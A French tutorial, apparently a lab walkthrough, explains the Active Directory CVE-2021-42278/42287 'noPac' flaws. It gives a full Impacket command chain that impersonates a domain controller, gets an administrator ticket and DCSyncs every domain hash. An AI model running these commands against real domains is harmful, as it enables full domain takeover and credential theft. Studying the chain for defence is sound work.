# CVE-2021-42278 - Usurpation de nom (Name impersonation)

Les comptes machine doivent avoir un `$` final dans leur nom (attribut `sAMAccountName`), mais aucun processus de validation n'existait pour s'en assurer. Combiné à CVE-2021-42287, cela permettait à des attaquants d'usurper des comptes de contrôleur de domaine.

# CVE-2021-42287 - KDC bamboozling

Pour demander un Service Ticket, il faut d'abord présenter un TGT. Quand le service ticket demandé n'est pas trouvé par le KDC, celui-ci refait automatiquement une recherche avec un `$` final. Concrètement, si un TGT est obtenu pour `bob`, et que l'utilisateur `bob` est supprimé, utiliser ce TGT pour demander un service ticket pour un autre utilisateur envers lui-même (S4U2self) fera chercher `bob$` dans l'AD par le KDC. Si le compte de contrôleur de domaine `bob$` existe, alors `bob` (l'utilisateur) vient d'obtenir un service ticket pour `bob$` (le compte du contrôleur de domaine) comme n'importe quel autre utilisateur 🤯.

# Pré-requis

* Un contrôleur de domaine auquel il manque les patchs de sécurité KB5008380 et KB5008602
* Un compte utilisateur de domaine valide
* Le quota de comptes machine (machine account quota) doit être supérieur à 0

La capacité à modifier les attributs sAMAccountName et servicePrincipalName d'un compte machine est un prérequis de la chaîne d'attaque. À vérifier avec Bloodhound ou NetExec :

```bash
nxc ldap winterfell.north.sevenkingdoms.local -u jon.snow -p iknownothing -d north.sevenkingdoms.local -M daclread -o TARGET='testj$'
```

Ou la capacité à ajouter des machines. À valider en vérifiant le quota de comptes machine.

```bash
nxc ldap winterfell.north.sevenkingdoms.local -u jon.snow -p iknownothing -d north.sevenkingdoms.local -M maq
```

# Exploit

Ce qu'on va faire : ajouter une machine, vider le SPN de cette machine, renommer la machine avec le même nom que le DC, obtenir un TGT pour cette machine, remettre le nom d'origine de la machine, obtenir un service ticket avec le TGT obtenu précédemment, et enfin dcsync.

Ajouter une nouvelle machine

```bash
addcomputer.py -computer-name 'samaccountname$' -computer-pass 'ComputerPassword' -dc-host winterfell.north.sevenkingdoms.local -domain-netbios NORTH 'north.sevenkingdoms.local/jon.snow:iknownothing'
```

Vider les SPN de notre nouvelle machine (avec l'outil addspn de dirkjan [krbrelayx](https://github.com/dirkjanm/krbrelayx))

```bash
addspn.py --clear -t 'samaccountname$' -u 'north.sevenkingdoms.local\jon.snow' -p 'iknownothing' 'winterfell.north.sevenkingdoms.local'
```

Renommer la machine (machine -> DC)

```bash
renameMachine.py -current-name 'samaccountname$' -new-name 'winterfell' -dc-ip 'winterfell.north.sevenkingdoms.local' north.sevenkingdoms.local/jon.snow:iknownothing
```

Obtenir un TGT

```bash
getTGT.py -dc-ip 'winterfell.north.sevenkingdoms.local' 'north.sevenkingdoms.local'/'winterfell':'ComputerPassword'
```

Remettre le nom d'origine de la machine

```bash
renameMachine.py -current-name 'winterfell' -new-name 'samaccount$' north.sevenkingdoms.local/jon.snow:iknownothing
```

Obtenir un service ticket via S4U2self en présentant le TGT précédent

```bash
export KRB5CCNAME=/workspace/winterfell.ccache
getST.py -self -impersonate 'administrator' -altservice 'CIFS/winterfell.north.sevenkingdoms.local' -k -no-pass -dc-ip 'winterfell.north.sevenkingdoms.local' 'north.sevenkingdoms.local'/'winterfell' -debug
```

DCSync en présentant le service ticket

```bash
export KRB5CCNAME=/workspace/administrator@CIFS_winterfell.north.sevenkingdoms.local@NORTH.SEVENKINGDOMS.LOCAL.ccache
secretsdump.py -k -no-pass -dc-ip 'winterfell.north.sevenkingdoms.local' @'winterfell.north.sevenkingdoms.local'
```

Nettoyer en supprimant la machine créée, avec le hash du compte administrateur qu'on vient d'obtenir

```bash
addcomputer.py -computer-name 'samaccountname$' -delete -dc-host winterfell.north.sevenkingdoms.local -domain-netbios NORTH -hashes 'aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4' 'north.sevenkingdoms.local/Administrator'
```
